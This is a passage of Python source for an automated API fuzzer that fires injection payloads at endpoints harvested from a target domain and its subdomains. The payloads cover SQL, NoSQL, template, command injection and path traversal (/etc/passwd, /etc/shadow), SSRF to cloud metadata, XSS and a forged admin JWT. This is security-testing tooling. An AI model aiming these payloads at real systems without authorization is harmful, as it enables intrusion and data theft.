# AI_api_fuzzer.py
#
# Autonomous fuzzing workflow per injection point:
#   1. PROBE      — baseline request to characterise normal response
#   2. DISCOVER   — enumerate parameters, schema, auth requirements
#   3. CLASSIFY   — determine API type (REST/GraphQL/SOAP/RPC)
#   4. FUZZ       — structured payload sequences per param_type + vuln_class
#   5. DETECT     — response anomaly analysis (status, length, latency, error strings)
#   6. ESCALATE   — if anomaly confirmed, run targeted deep payload set
#   7. EVIDENCE   — log every request with args, response summary, anomaly verdict
#   8. REPORT     — AI summary of findings per endpoint

import json
import time
import re
import hashlib
import logging
import random
import requests as req_lib
from copy import deepcopy
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set, Any
from urllib.parse import urlparse, urlencode, urljoin, parse_qs, quote

from core.http_client import HTTPClient


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

GROQ_API_KEY = __import__("os").getenv("GROQ_API_KEY", "")

# Request constraints — stay within safe bounds
MAX_REQUESTS_PER_ENDPOINT = 80
MAX_ENDPOINTS             = 20
MAX_RESPONSE_BODY_STORE   = 2000   # bytes stored per response in evidence
REQUEST_DELAY_BASE        = 0.4    # seconds between requests
REQUEST_DELAY_WAF         = 1.2    # slower when WAF detected
TIMEOUT_PROBE             = 8
TIMEOUT_FUZZ              = 10

# Anomaly detection thresholds
ANOMALY_LENGTH_DELTA_PCT  = 0.30   # >30% length change vs baseline = anomaly signal
ANOMALY_LATENCY_MULTIPLIER = 3.0   # >3x baseline latency = time-based signal
INTERESTING_STATUS_CODES  = {500, 501, 502, 503, 400, 401, 403, 422, 429}
TIME_BASED_THRESHOLD_S    = 4.5    # seconds — if sleep payload causes this delay

# Payload sets — compact, chosen for maximum signal:noise ratio
# Organised by injection class and param context

FUZZ_PAYLOADS: Dict[str, Dict[str, List]] = {

    # ── SQL injection — string-breaking + time-based ──────────────────
    "sqli": {
        "quick_break": [
            "'", '"', "\\", "';--", "\"--", "'/*", "1'1",
            "' OR '1'='1", "1 OR 1=1", "' OR 1=1--",
        ],
        "time_based": [
            "' AND SLEEP(5)-- -",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- -",
            "'; WAITFOR DELAY '0:0:5'-- -",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
        ],
        "error_trigger": [
            "' AND extractvalue(1,concat(0x7e,version()))-- -",
            "' AND CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM information_schema.tables))-- -",
            "' AND 1=CAST((SELECT version()) AS int)-- -",
        ],
        "union_probe": [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT NULL,NULL,NULL-- -",
        ],
    },

    # ── NoSQL injection ───────────────────────────────────────────────
    "nosql": {
        "operator_injection": [
            {"$gt": ""},
            {"$ne": None},
            {"$regex": ".*"},
            {"$exists": True},
            {"$where": "1==1"},
        ],
        "js_injection": [
            "' || '1'=='1",
            "'; return true; var x='",
            "' || sleep(5000) || '",
        ],
        "php_array": [
            "[$ne]=invalid",
            "[$gt]=",
            "[$regex]=.*",
        ],
    },

    # ── SSTI detection polyglot ───────────────────────────────────────
    "ssti": {
        "detection": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
    },

    # ── SSRF probes ───────────────────────────────────────────────────
    "ssrf": {
        "internal": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
        "bypass": [
            "http://127.1/",
            "http://0x7f000001/",
            "http://[::1]/",
            "http://127.0.0.1.xip.io/",
        ],
    },

    # ── Command injection ─────────────────────────────────────────────
    "cmdi": {
        "unix": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "\nid\n",
        ],
        "blind_oob": [
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1",
        ],
        "windows": [
            "& whoami",
            "| whoami",
            "; whoami",
            "& dir c:\\",
        ],
    },

    # ── Path traversal ────────────────────────────────────────────────
    "path_traversal": {
        "unix": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "../../../etc/shadow",
            "../../../proc/self/environ",
        ],
        "windows": [
            "..\\..\\..\\windows\\win.ini",
            "..%5C..%5C..%5Cwindows%5Cwin.ini",
        ],
    },

    # ── XSS ──────────────────────────────────────────────────────────
    "xss": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
        ],
    },

    # ── JWT / Auth header probes ──────────────────────────────────────
    "auth_bypass": {
        "headers": [
            {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."},
            {"Authorization": "Bearer null"},
            {"X-Auth-Token": "admin"},
            {"X-Original-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ],
    },

    # ── Mass assignment probes ────────────────────────────────────────
    "mass_assignment": {
        "admin_fields": [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"privilege": "superuser"},
            {"permissions": ["admin", "write", "read"]},
            {"user_level": 0},
            {"account_type": "premium"},
        ],
    },

    # ── GraphQL specific ──────────────────────────────────────────────
    "graphql": {
        "introspection": [
            {"query": "{__schema{types{name}}}"},
            {"query": "{__type(name:\"Query\"){fields{name}}}"},
        ],
        "batch_abuse": [
            [{"query": "mutation{login(user:\"admin\",password:\"a\")}"},
             {"query": "mutation{login(user:\"admin\",password:\"b\")}"}],
        ],
        "nosql_via_graphql": [
            {"query": "{user(id:\"1 OR 1=1\"){name email}}"},
        ],
    },

    # ── IDOR probes ───────────────────────────────────────────────────
    "idor": {
        "numeric": ["0", "1", "2", "-1", "999999", "0000001"],
        "uuid":    ["00000000-0000-0000-0000-000000000001"],
        "param_pollution": ["id=1&id=2", "user_id=1&user_id=2"],
    },

    # ── Type confusion / boundary probes ─────────────────────────────
    "type_confusion": {
        "boundary": [
            None,
            True,
            False,
            0,
            -1,
            9999999999,
            1.7976931348623157e+308,
            [],
            {},
            "",
            " ",
            "\x00",
            "A" * 8192,
            "A" * 65536,
        ],
    },
}

# Error signature patterns — matched against response body
ERROR_SIGNATURES: Dict[str, List[str]] = {
    "sql_error": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sqlstate",
        "org.postgresql.util.psqlexception",
        "microsoft sql server",
        "oledb provider",
        "syntax error near",
        "invalid column name",
        "division by zero",
        "unknown column",
        "table or view not found",
    ],
    "nosql_error": [
        "mongodberror",
        "mongoerror",
        "bsontype",
        "documents found",
        "castto objectid",
        "invalid bson",
    ],
    "ssti_confirmed": [
        "49",    # 7*7 = 49
        "jinja2",
        "undefined template variable",
        "template render",
        "freemarker",
        "velocity",
    ],
    "path_traversal_hit": [
        "root:x:0:0",
        "[boot loader]",
        "daemon:x:1:",
        "www-data:x:33",
        "\r\n; for 16-bit app support",
    ],
    "cmdi_confirmed": [
        "uid=",
        "gid=",
        "groups=",
        "root",
        "www-data",
    ],
    "stack_trace": [
        "traceback (most recent call",
        "exception in thread",
        "at com.",
        "at org.",
        "stack trace:",
        "unhandled exception",
        "null pointer exception",
        "index out of range",
        "typeerror:",
        "valueerror:",
        "keyerror:",
        "attributeerror:",
    ],
    "info_disclosure": [
        "version",
        "php/",
        "apache/",
        "nginx/",
        "iis/",
        "express",
        "django",
        "flask",
        "rails",
        "spring",
        "powered by",
        "server:",
        "x-powered-by:",
    ],
}

# Anomaly verdict levels
VERDICT_CLEAN    = "clean"
VERDICT_SIGNAL   = "signal"       # one anomaly indicator
VERDICT_LIKELY   = "likely"       # two or more indicators
VERDICT_CONFIRMED = "confirmed"   # error signature or time-based proof


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

class FuzzRequest:
    """One recorded fuzz attempt."""
    __slots__ = (
        "req_id", "endpoint_id", "timestamp",
        "method", "url", "headers", "params", "body",
        "payload_class", "payload_subtype", "payload_value",
        "response_status", "response_length", "response_time_s",
        "response_body_snippet", "response_headers",
        "anomaly_verdict", "anomaly_signals", "error_signatures_found",
        "sha256",
    )

    def __init__(
        self,
        endpoint_id:    str,
        method:         str,
        url:            str,
        headers:        Dict,
        params:         Dict,
        body:           Any,
        payload_class:  str,
        payload_subtype: str,
        payload_value:  Any,
    ):
        self.req_id          = hashlib.md5(
            f"{endpoint_id}{url}{json.dumps(body, default=str)}{time.time()}".encode()
        ).hexdigest()[:12]
        self.endpoint_id     = endpoint_id
        self.timestamp       = datetime.now().isoformat()
        self.method          = method
        self.url             = url
        self.headers         = {k: v for k, v in headers.items()
                                if k.lower() not in ("authorization",)}  # redact auth
        self.params          = params
        self.body            = body
        self.payload_class   = payload_class
        self.payload_subtype = payload_subtype
        self.payload_value   = payload_value
        self.response_status       = 0
        self.response_length       = 0
        self.response_time_s       = 0.0
        self.response_body_snippet = ""
        self.response_headers      = {}
        self.anomaly_verdict       = VERDICT_CLEAN
        self.anomaly_signals:      List[str] = []
        self.error_signatures_found: List[str] = []
        # Hash for evidence integrity
        raw = f"{self.req_id}|{method}|{url}|{json.dumps(body,default=str)}"
        self.sha256 = hashlib.sha256(raw.encode()).hexdigest()

    def to_dict(self) -> Dict:
        return {k: getattr(self, k) for k in self.__slots__}


class EndpointFuzzResult:
    """Aggregated results for one endpoint."""

    def __init__(self, endpoint_id: str, url: str, method: str, param_type: str):
        self.endpoint_id  = endpoint_id
        self.url          = url
        self.method       = method
        self.param_type   = param_type
        self.baseline:    Optional[FuzzRequest] = None
        self.requests:    List[FuzzRequest]     = []
        self.findings:    List[Dict]            = []
        self.api_type:    Optional[str]         = None
        self.params_found: List[str]            = []
        self.auth_required: bool                = False
        self.total_requests: int                = 0

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)

    @property
    def highest_verdict(self) -> str:
        verdicts = [r.anomaly_verdict for r in self.requests]
        for v in (VERDICT_CONFIRMED, VERDICT_LIKELY, VERDICT_SIGNAL):
            if v in verdicts:
                return v
        return VERDICT_CLEAN

    def to_dict(self) -> Dict:
        return {
            "endpoint_id":    self.endpoint_id,
            "url":            self.url,
            "method":         self.method,
            "param_type":     self.param_type,
            "api_type":       self.api_type,
            "auth_required":  self.auth_required,
            "params_found":   self.params_found,
            "total_requests": self.total_requests,
            "highest_verdict": self.highest_verdict,
            "findings":       self.findings,
            "request_log":    [r.to_dict() for r in self.requests],
        }


# ---------------------------------------------------------------------------
# Anomaly detector
# ---------------------------------------------------------------------------

class AnomalyDetector:
    """
    Stateless anomaly detector.
    Compares a fuzz response against the baseline for the same endpoint.
    """

    def analyse(
        self,
        req:      FuzzRequest,
        baseline: FuzzRequest,
    ) -> Tuple[str, List[str]]:
        """
        Returns (verdict, [signal_descriptions]).
        verdict: clean | signal | likely | confirmed
        """
        signals:   List[str] = []
        confirmed: bool      = False

        body = req.response_body_snippet.lower()

        # ── Error signature matching ──────────────────────────────────
        for category, patterns in ERROR_SIGNATURES.items():
            for pattern in patterns:
                if pattern in body:
                    req.error_signatures_found.append(f"{category}:{pattern}")
                    if category in ("sql_error", "nosql_error",
                                    "ssti_confirmed", "path_traversal_hit",
                                    "cmdi_confirmed"):
                        signals.append(f"ERROR_SIG:{category}:{pattern[:40]}")
                        confirmed = True
                    elif category == "stack_trace":
                        signals.append(f"STACK_TRACE:{pattern[:40]}")
                        confirmed = True
                    else:
                        signals.append(f"INFO_LEAK:{pattern[:30]}")

        # ── Status code anomaly ───────────────────────────────────────
        if req.response_status in INTERESTING_STATUS_CODES:
            if req.response_status != baseline.response_status:
                signals.append(f"STATUS_CHANGE:{baseline.response_status}→{req.response_status}")

        if req.response_status == 500 and baseline.response_status != 500:
            signals.append("SERVER_ERROR_500")
            confirmed = True

        # ── Response length anomaly ───────────────────────────────────
        if baseline.response_length > 0:
            delta = abs(req.response_length - baseline.response_length)
            pct   = delta / baseline.response_length
            if pct > ANOMALY_LENGTH_DELTA_PCT:
                signals.append(
                    f"LENGTH_DELTA:{baseline.response_length}→"
                    f"{req.response_length}({pct:.0%})"
                )

        # ── Time-based detection ──────────────────────────────────────
        if (req.response_time_s - baseline.response_time_s) > TIME_BASED_THRESHOLD_S:
            signals.append(
                f"TIME_BASED:{baseline.response_time_s:.2f}s→"
                f"{req.response_time_s:.2f}s"
            )
            confirmed = True

        # ── SSTI arithmetic confirmation ──────────────────────────────
        if "49" in body and "{{7*7}}" in str(req.payload_value):
            signals.append("SSTI_ARITHMETIC:7*7=49_REFLECTED")
            confirmed = True

        # ── Reflection check — did the payload echo back? ─────────────
        payload_str = str(req.payload_value)
        if len(payload_str) > 3 and payload_str[:8] in body:
            signals.append(f"PAYLOAD_REFLECTED:{payload_str[:20]}")

        # ── SSRF OOB indicator — response references internal IP ──────
        if any(internal in body for internal in
               ("169.254.169.", "169.254.169", "metadata", "ami-id", "instance-id")):
            signals.append("SSRF_METADATA_RESPONSE")
            confirmed = True

        # ── Determine verdict ─────────────────────────────────────────
        if confirmed:
            verdict = VERDICT_CONFIRMED
        elif len(signals) >= 2:
            verdict = VERDICT_LIKELY
        elif len(signals) == 1:
            verdict = VERDICT_SIGNAL
        else:
            verdict = VERDICT_CLEAN

        return verdict, signals


# ---------------------------------------------------------------------------
# API classifier
# ---------------------------------------------------------------------------

class APIClassifier:
    """Classify an endpoint as REST / GraphQL / SOAP / RPC / Web from baseline response."""

    def classify(self, baseline: FuzzRequest) -> str:
        url  = baseline.url.lower()
        body = baseline.response_body_snippet.lower()
        hdrs = {k.lower(): v.lower() for k, v in baseline.response_headers.items()}

        content_type = hdrs.get("content-type", "")

        if "graphql" in url or "graphql" in body:
            return "graphql"
        if "wsdl" in url or "soap" in body or "envelope" in body:
            return "soap"
        if "/rpc" in url or "jsonrpc" in body or "xmlrpc" in url:
            return "rpc"
        if "application/json" in content_type or "json" in body[:50]:
            if re.search(r"/api/|/v\d+/|/rest/|/service/", url):
                return "rest_api"
            return "rest_json"
        if "text/html" in content_type:
            return "web_form"
        return "unknown"

    def infer_params(self, baseline: FuzzRequest) -> List[str]:
        """Try to extract parameter names from baseline response body (JSON keys)."""
        params: List[str] = []
        try:
            data = json.loads(baseline.response_body_snippet)
            if isinstance(data, dict):
                params = list(data.keys())[:20]
            elif isinstance(data, list) and data and isinstance(data[0], dict):
                params = list(data[0].keys())[:20]
        except (json.JSONDecodeError, TypeError):
            pass
        return params


# ---------------------------------------------------------------------------
# Request engine
# ---------------------------------------------------------------------------

class FuzzEngine:
    """
    Sends fuzz requests, captures full response metadata, enforces rate limits.
    Wraps HTTPClient to match its interface.
    """

    def __init__(self, delay: float = REQUEST_DELAY_BASE, timeout: int = TIMEOUT_FUZZ):
        self.delay   = delay
        self.timeout = timeout
        self._session = req_lib.Session()
        self._session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
            ]),
            "Accept":          "application/json, text/html, */*",
            "Accept-Encoding": "gzip, deflate",
        })
        self._last_send = 0.0

    def send(self, req: FuzzRequest) -> None:
        """
        Execute the request and populate req's response fields in-place.
        Never raises — all errors are recorded in the FuzzRequest.
        """
        # Rate limiting
        gap = time.time() - self._last_send
        if gap < self.delay:
            time.sleep(self.delay - gap)
        self._last_send = time.time()

        try:
            kwargs = {
                "timeout": self.timeout,
                "verify":  False,
                "allow_redirects": True,
            }

            # Merge extra headers from req
            merged_headers = dict(self._session.headers)
            merged_headers.update(req.headers)

            if req.method.upper() == "GET":
                resp = self._session.get(
                    req.url, params=req.params,
                    headers=merged_headers, **kwargs
                )
            elif req.method.upper() in ("POST", "PUT", "PATCH"):
                if isinstance(req.body, dict) or isinstance(req.body, list):
                    resp = self._session.request(
                        req.method.upper(), req.url,
                        json=req.body, headers=merged_headers, **kwargs
                    )
                else:
                    resp = self._session.request(
                        req.method.upper(), req.url,
                        data=str(req.body), headers=merged_headers, **kwargs
                    )
            elif req.method.upper() == "DELETE":
                resp = self._session.delete(
                    req.url, headers=merged_headers, **kwargs
                )
            else:
                resp = self._session.request(
                    req.method.upper(), req.url,
                    headers=merged_headers, **kwargs
                )

            req.response_status  = resp.status_code
            req.response_length  = len(resp.content)
            req.response_time_s  = resp.elapsed.total_seconds()
            req.response_body_snippet = resp.text[:MAX_RESPONSE_BODY_STORE]
            req.response_headers = dict(resp.headers)

        except req_lib.exceptions.Timeout:
            req.response_time_s  = self.timeout
            req.response_status  = 0
            req.anomaly_signals.append("REQUEST_TIMEOUT")
        except req_lib.exceptions.ConnectionError:
            req.response_status  = 0
            req.anomaly_signals.append("CONNECTION_ERROR")
        except Exception as exc:
            req.response_status  = 0
            req.anomaly_signals.append(f"EXCEPTION:{str(exc)[:60]}")


# ---------------------------------------------------------------------------
# Payload builder — constructs FuzzRequest objects per injection context
# ---------------------------------------------------------------------------

class PayloadBuilder:
    """
    Builds typed FuzzRequest objects from raw payloads and endpoint context.
    Handles GET params, JSON body, form body, path params, header injection.
    """

    def build_requests(
        self,
        endpoint:       Dict,
        payload_class:  str,
        payload_subtype: str,
        payload_values: List,
        base_params:    Optional[Dict] = None,
        base_body:      Optional[Dict] = None,
    ) -> List[FuzzRequest]:
        url        = endpoint["url"]
        method     = endpoint["method"].upper()
        param_type = endpoint["param_type"]
        ep_id      = endpoint["_id"]
        reqs: List[FuzzRequest] = []

        for pval in payload_values:
            if param_type == "url_param":
                reqs += self._url_param_requests(
                    ep_id, url, method, payload_class,
                    payload_subtype, pval, base_params or {}
                )
            elif param_type == "json_body":
                reqs += self._json_body_requests(
                    ep_id, url, method, payload_class,
                    payload_subtype, pval, base_body or {}
                )
            elif param_type == "form_fields":
                reqs += self._form_requests(
                    ep_id, url, method, payload_class,
                    payload_subtype, pval, base_body or {}
                )
            elif param_type == "path_param":
                reqs += self._path_param_requests(
                    ep_id, url, method, payload_class,
                    payload_subtype, pval
                )
            elif param_type == "header_injection":
                reqs += self._header_injection_requests(
                    ep_id, url, method, payload_class,
                    payload_subtype, pval
                )

        return reqs

    def _url_param_requests(
        self, ep_id, url, method, pcls, ptype, pval, base_params
    ) -> List[FuzzRequest]:
        reqs = []
        # Fuzz each discovered param separately
        params_to_fuzz = list(base_params.keys()) or ["q", "id", "search", "query", "input"]
        for param_name in params_to_fuzz[:4]:
            params = dict(base_params)
            params[param_name] = pval
            reqs.append(FuzzRequest(
                endpoint_id    = ep_id,
                method         = "GET",
                url            = url,
                headers        = {},
                params         = params,
                body           = None,
                payload_class  = pcls,
                payload_subtype = ptype,
                payload_value  = pval,
            ))
        return reqs

    def _json_body_requests(
        self, ep_id, url, method, pcls, ptype, pval, base_body
    ) -> List[FuzzRequest]:
        reqs = []
        # Fuzz each key in known body structure
        keys_to_fuzz = list(base_body.keys()) or ["id", "query", "data", "value", "input", "name"]
        for key in keys_to_fuzz[:4]:
            body = deepcopy(base_body)
            body[key] = pval
            reqs.append(FuzzRequest(
                endpoint_id    = ep_id,
                method         = method if method != "GET" else "POST",
                url            = url,
                headers        = {"Content-Type": "application/json"},
                params         = {},
                body           = body,
                payload_class  = pcls,
                payload_subtype = ptype,
                payload_value  = pval,
            ))
        # Also try payload as root-level JSON (replace entire body)
        reqs.append(FuzzRequest(
            endpoint_id    = ep_id,
            method         = method if method != "GET" else "POST",
            url            = url,
            headers        = {"Content-Type": "application/json"},
            params         = {},
            body           = pval if isinstance(pval, (dict, list)) else {"payload": pval},
            payload_class  = pcls,
            payload_subtype = ptype + "_root",
            payload_value  = pval,
        ))
        return reqs

    def _form_requests(
        self, ep_id, url, method, pcls, ptype, pval, base_body
    ) -> List[FuzzRequest]:
        reqs = []
        fields = list(base_body.keys()) or ["username", "password", "email", "search"]
        for field in fields[:3]:
            body = dict(base_body)
            body[field] = pval
            reqs.append(FuzzRequest(
                endpoint_id    = ep_id,
                method         = "POST",
                url            = url,
                headers        = {"Content-Type": "application/x-www-form-urlencoded"},
                params         = {},
                body           = urlencode({k: str(v) for k, v in body.items()}),
                payload_class  = pcls,
                payload_subtype = ptype,
                payload_value  = pval,
            ))
        return reqs

    def _path_param_requests(
        self, ep_id, url, method, pcls, ptype, pval
    ) -> List[FuzzRequest]:
        # Replace numeric path segments with payload
        new_url = re.sub(r"/(\d+)(/|$)", f"/{quote(str(pval), safe='')}/", url)
        if new_url == url:
            new_url = url.rstrip("/") + "/" + quote(str(pval), safe="")
        return [FuzzRequest(
            endpoint_id    = ep_id,
            method         = method,
            url            = new_url,
            headers        = {},
            params         = {},
            body           = None,
            payload_class  = pcls,
            payload_subtype = ptype,
            payload_value  = pval,
        )]

    def _header_injection_requests(
        self, ep_id, url, method, pcls, ptype, pval
    ) -> List[FuzzRequest]:
        reqs = []
        if isinstance(pval, dict):
            reqs.append(FuzzRequest(
                endpoint_id    = ep_id,
                method         = method,
                url            = url,
                headers        = pval,
                params         = {},
                body           = None,
                payload_class  = pcls,
                payload_subtype = ptype,
                payload_value  = pval,
            ))
        return reqs


# ---------------------------------------------------------------------------
# Main fuzzer
# ---------------------------------------------------------------------------

class AIAPIFuzzer:
    """
    Autonomous API fuzzer for ARTEX.

    Reads injection_points from payload_analysis (json_body / api_endpoint
    / url_param / path_param param_type entries) and autonomously:
        1. Probes baseline behaviour per endpoint
        2. Classifies API type (REST/GraphQL/SOAP/RPC/Web)
        3. Discovers parameters from JSON response schemas
        4. Selects payload classes relevant to the endpoint + tech stack
        5. Fuzzes with structured payload sequences
        6. Detects response anomalies (status, length, latency, error strings)
        7. Escalates confirmed anomalies with deeper payload sets
        8. Records every request as a signed evidence entry
        9. Sends findings to Groq for analyst-grade summary

    Slot in run_scan() after payload_analysis:
        fuzzer = AIAPIFuzzer(groq_api_key=GROQ_API_KEY)
        scan_results[scan_id]['api_fuzz_results'] = fuzzer.fuzz(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        groq_api_key:  str = GROQ_API_KEY,
        max_endpoints: int = MAX_ENDPOINTS,
        max_per_ep:    int = MAX_REQUESTS_PER_ENDPOINT,
    ):
        self.groq_api_key  = groq_api_key
        self.max_endpoints = max_endpoints
        self.max_per_ep    = max_per_ep

        self.detector   = AnomalyDetector()
        self.classifier = APIClassifier()
        self.builder    = PayloadBuilder()

        self.logger = logging.getLogger(__name__)
        if not self.logger.handlers:
            h = logging.StreamHandler()
            h.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] AIAPIFuzzer — %(message)s"
            ))
            self.logger.addHandler(h)
            self.logger.setLevel(logging.INFO)

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def fuzz(
        self,
        domain:       str,
        scan_results: Dict,
    ) -> Dict:
        """
        Args:
            domain:       Primary target domain.
            scan_results: Full ARTEX scan_results dict.

        Returns dict with keys:
            endpoints_tested   — list of EndpointFuzzResult dicts
            findings           — de-duplicated confirmed/likely findings
            total_requests     — int
            endpoints_with_findings — int
            coverage_map       — {param_type: count}
            ai_analysis        — Groq summary (or None)
            scan_metadata
        """
        self.logger.info(f"API fuzzing starting — domain: {domain}")
        start = time.time()

        # ── Extract endpoints from payload_analysis ───────────────────
        endpoints = self._extract_endpoints(scan_results)
        if not endpoints:
            self.logger.info("No fuzzable endpoints found in payload_analysis")
            return self._empty_result(domain, start)

        self.logger.info(f"Found {len(endpoints)} fuzzable endpoints")

        # ── Determine WAF delay ───────────────────────────────────────
        waf = (scan_results.get("payload_analysis") or {}).get("waf_detected", {})
        delay = REQUEST_DELAY_WAF if waf.get("detected") else REQUEST_DELAY_BASE
        engine = FuzzEngine(delay=delay, timeout=TIMEOUT_FUZZ)

        # ── Fuzz each endpoint ────────────────────────────────────────
        ep_results: List[EndpointFuzzResult] = []
        total_reqs = 0

        for ep in endpoints[:self.max_endpoints]:
            self.logger.info(f"Fuzzing: {ep['method']} {ep['url']} [{ep['param_type']}]")
            result = self._fuzz_endpoint(ep, engine, scan_results)
            ep_results.append(result)
            total_reqs += result.total_requests

            self.logger.info(
                f"  → {result.total_requests} requests, "
                f"verdict={result.highest_verdict}, "
                f"findings={len(result.findings)}"
            )

        # ── Aggregate findings ────────────────────────────────────────
        all_findings = self._aggregate_findings(ep_results)

        # ── Coverage map ──────────────────────────────────────────────
        coverage_map: Dict[str, int] = {}
        for ep in ep_results:
            coverage_map[ep.param_type] = coverage_map.get(ep.param_type, 0) + 1

        # ── AI analysis ───────────────────────────────────────────────
        ai_result = None
        if self.groq_api_key and all_findings:
            ai_result = self._ai_analysis(domain, ep_results, all_findings)

        duration = round(time.time() - start, 2)
        self.logger.info(
            f"Fuzzing complete — {total_reqs} requests, "
            f"{len(all_findings)} findings in {duration}s"
        )

        return {
            "endpoints_tested":          [r.to_dict() for r in ep_results],
            "findings":                   all_findings,
            "total_requests":             total_reqs,
            "endpoints_with_findings":    sum(1 for r in ep_results if r.has_findings),
            "coverage_map":               coverage_map,
            "ai_analysis":                ai_result,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": duration,
                "timestamp":             datetime.now().isoformat(),
                "ai_model":              "Groq Llama3-70B" if ai_result else "Rule-based only",
                "waf_detected":          waf.get("name") if waf.get("detected") else None,
                "request_delay_s":       delay,
            },
        }

    # ------------------------------------------------------------------
    # Endpoint extraction
    # ------------------------------------------------------------------

    def _extract_endpoints(self, scan_results: Dict) -> List[Dict]:
        """
        Pull injection_points from payload_analysis.
        Filter to json_body, api_endpoint, url_param, path_param types.
        Augment with endpoints discovered from subdomains + tech_detection.
        """
        pa     = scan_results.get("payload_analysis") or {}
        raw_ips = pa.get("injection_points", [])

        FUZZABLE_TYPES = {"json_body", "url_param", "path_param", "form_fields"}
        endpoints: List[Dict] = []
        seen_urls: Set[str]   = set()

        for ip in raw_ips:
            if not isinstance(ip, dict):
                continue
            pt  = ip.get("param_type", "")
            url = ip.get("url", "")
            if pt not in FUZZABLE_TYPES or not url:
                continue
            canon = url.lower().rstrip("/")
            if canon in seen_urls:
                continue
            seen_urls.add(canon)

            ep = dict(ip)
            ep["_id"] = hashlib.md5(url.encode()).hexdigest()[:10]
            endpoints.append(ep)

        # ── Add API endpoints discovered from subdomains ──────────────
        subdomains = scan_results.get("subdomains") or []
        api_paths  = [
            "/api/", "/api/v1/", "/api/v2/", "/graphql",
            "/rest/", "/service/", "/ws/",
        ]
        for sub in subdomains[:20]:
            if not isinstance(sub, dict):
                continue
            sub_name = sub.get("subdomain", "")
            http_ok  = sub.get("http_status") == 200
            https_ok = sub.get("https_status") == 200
            if not (http_ok or https_ok):
                continue

            scheme = "https" if https_ok else "http"
            for path in api_paths[:3]:
                url = f"{scheme}://{sub_name}{path}"
                canon = url.lower().rstrip("/")
                if canon in seen_urls:
                    continue
                seen_urls.add(canon)
                endpoints.append({
                    "_id":        hashlib.md5(url.encode()).hexdigest()[:10],
                    "surface":    "api_endpoint",
                    "url":        url,
                    "method":     "POST" if "graphql" in path else "GET",
                    "param_type": "json_body" if "graphql" in path else "url_param",
                    "notes":      f"Discovered from active subdomain {sub_name}",
                })

        return endpoints[:self.max_endpoints]

    # ------------------------------------------------------------------
    # Single endpoint fuzzer
    # ------------------------------------------------------------------

    def _fuzz_endpoint(
        self,
        endpoint: Dict,
        engine:   FuzzEngine,
        scan_results: Dict,
    ) -> EndpointFuzzResult:
        ep_id      = endpoint["_id"]
        url        = endpoint["url"]
        method     = endpoint.get("method", "GET").upper()
        param_type = endpoint.get("param_type", "url_param")

        result = EndpointFuzzResult(ep_id, url, method, param_type)

        # ── Step 1: PROBE — baseline ──────────────────────────────────
        baseline = self._probe_baseline(ep_id, url, method)
        engine.send(baseline)
        result.baseline = baseline

        if baseline.response_status == 0:
            # Endpoint unreachable — log and skip
            result.findings.append({
                "type":     "unreachable",
                "url":      url,
                "severity": "info",
                "detail":   f"Endpoint unreachable: {baseline.anomaly_signals}",
            })
            return result

        result.total_requests += 1
        result.auth_required = baseline.response_status in (401, 403)

        # ── Step 2: DISCOVER — API type + params ─────────────────────
        result.api_type   = self.classifier.classify(baseline)
        result.params_found = self.classifier.infer_params(baseline)

        self.logger.debug(
            f"  Baseline: status={baseline.response_status} "
            f"len={baseline.response_length} "
            f"api_type={result.api_type}"
        )

        # ── Step 3: SELECT payload classes for this endpoint ──────────
        payload_classes = self._select_payload_classes(
            result.api_type, param_type, scan_results
        )

        # Base body/params from baseline response (inferred schema)
        base_body = {}
        try:
            parsed = json.loads(baseline.response_body_snippet)
            if isinstance(parsed, dict):
                base_body = {k: "" for k in list(parsed.keys())[:6]}
        except (json.JSONDecodeError, TypeError):
            pass

        # ── Step 4: FUZZ ─────────────────────────────────────────────
        budget_remaining = self.max_per_ep - 1  # -1 for baseline

        for pcls, ptype, payloads in payload_classes:
            if budget_remaining <= 0:
                break

            reqs = self.builder.build_requests(
                endpoint       = endpoint,
                payload_class  = pcls,
                payload_subtype = ptype,
                payload_values  = payloads[:min(len(payloads), 6)],
                base_params    = {p: "test" for p in result.params_found[:4]},
                base_body      = base_body,
            )

            for req in reqs[:min(len(reqs), budget_remaining)]:
                engine.send(req)
                verdict, signals = self.detector.analyse(req, baseline)
